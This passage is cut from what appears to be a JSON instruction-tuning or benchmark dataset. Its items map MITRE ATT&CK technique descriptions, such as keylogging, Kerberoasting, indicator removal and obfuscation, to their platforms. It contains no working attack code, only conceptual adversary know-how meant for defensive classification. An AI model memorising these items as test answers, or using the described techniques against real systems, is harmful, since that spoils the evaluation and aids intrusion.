      "answer": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.?",
    "context": "",
    "output": "The provided description is related to MITRE technique User Execution: Malicious Link (T1204.001);\nTechnique User Execution: Malicious Link (T1204.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
      "answer": "The provided description is related to MITRE technique User Execution: Malicious Link (T1204.001);\nTechnique User Execution: Malicious Link (T1204.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.\n\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions. \n\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.\n\nOn a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Location Discovery: System Language Discovery (T1614.001);\nTechnique System Location Discovery: System Language Discovery (T1614.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.\n\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions. \n\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.\n\nOn a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.",
      "answer": "The provided description is related to MITRE technique System Location Discovery: System Language Discovery (T1614.001);\nTechnique System Location Discovery: System Language Discovery (T1614.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "context": "",
    "output": "The provided description is related to MITRE technique Query Registry (T1012);\nTechnique Query Registry (T1012) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "answer": "The provided description is related to MITRE technique Query Registry (T1012);\nTechnique Query Registry (T1012) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
    "context": "",
    "output": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "answer": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force. \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials. \n\nThis same behavior could be executed using service tickets captured from network traffic.\n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Steal or Forge Kerberos Tickets: Kerberoasting (T1558.003);\nTechnique Steal or Forge Kerberos Tickets: Kerberoasting (T1558.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force. \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials. \n\nThis same behavior could be executed using service tickets captured from network traffic.\n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.",
      "answer": "The provided description is related to MITRE technique Steal or Forge Kerberos Tickets: Kerberoasting (T1558.003);\nTechnique Steal or Forge Kerberos Tickets: Kerberoasting (T1558.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading: Masquerade Task or Service (T1036.004);\nTechnique Masquerading: Masquerade Task or Service (T1036.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
      "answer": "The provided description is related to MITRE technique Masquerading: Masquerade Task or Service (T1036.004);\nTechnique Masquerading: Masquerade Task or Service (T1036.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.",
    "context": "",
    "output": "The provided description is related to MITRE technique Video Capture (T1125);\nTechnique Video Capture (T1125) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.",
      "answer": "The provided description is related to MITRE technique Video Capture (T1125);\nTechnique Video Capture (T1125) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Input Capture: Keylogging (T1056.001);\nTechnique Input Capture: Keylogging (T1056.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
      "answer": "The provided description is related to MITRE technique Input Capture: Keylogging (T1056.001);\nTechnique Input Capture: Keylogging (T1056.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Non-Application Layer Protocol (T1095);\nTechnique Non-Application Layer Protocol (T1095) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
      "answer": "The provided description is related to MITRE technique Non-Application Layer Protocol (T1095);\nTechnique Non-Application Layer Protocol (T1095) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Video Capture (T1125);\nTechnique Video Capture (T1125) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.",
      "answer": "The provided description is related to MITRE technique Video Capture (T1125);\nTechnique Video Capture (T1125) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
    "context": "",
    "output": "The provided description is related to MITRE technique Modify Registry (T1112);\nTechnique Modify Registry (T1112) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
      "answer": "The provided description is related to MITRE technique Modify Registry (T1112);\nTechnique Modify Registry (T1112) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
